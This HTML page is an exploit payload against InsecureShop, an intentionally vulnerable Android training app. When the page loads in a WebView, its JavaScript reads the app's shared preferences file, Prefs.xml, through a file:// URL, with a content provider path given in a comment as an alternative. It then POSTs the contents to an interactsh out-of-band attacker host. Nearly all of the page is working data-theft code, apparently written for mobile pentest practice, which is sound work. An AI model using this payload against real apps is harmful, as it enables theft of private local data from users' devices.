<html>
<body onload="doAttack()">
    <h1>Attack</h1>
    <script>
        function doAttack(){
            var target = "file:///data/data/com.insecureshop/shared_prefs/Prefs.xml";
            // var target = "content:///com.insecureshop.file_provider/root/data/data/com.insecureshop/shared_prefs/Prefs.xml";
            
            var xhr1 = new XMLHttpRequest();
            xhr1.overrideMimeType("text/plain; charset=iso-8859-1");
            xhr1.open("GET", target);
            xhr1.onreadystatechange = function(){
                if (xhr1.readyState == 4){
                    document.body.appendChild(document.createTextNode("In IF!"));
                    var content = xhr1.responseText;
                    sendFileToAttackerServer(content);
                    document.body.appendChild(document.createTextNode(content));
                }
            };
            xhr1.send()
            document.body.appendChild(document.createTextNode("After attack!"));
        }

        function sendFileToAttackerServer(content){
            document.body.appendChild(document.createTextNode("IN sendFileToAttackerServer!"));
            var xhr2 = new XMLHttpRequest();
            document.body.appendChild(document.createTextNode("OPEN XMLHttpRequest!"));
            xhr2.open("POST", "http://<INTERACTSH_TOKEN>");
            document.body.appendChild(document.createTextNode("OPENED XMLHttpRequest!"));
            xhr2.send(encodeURIComponent(content));
            document.body.appendChild(document.createTextNode("SENT XMLHttpRequest!"));
            
            document.body.appendChild(document.createTextNode(xhr2.responseText));
            document.body.appendChild(document.createTextNode("END sendFileToAttackerServer!"));

        }   
    </script>
</body>

</html>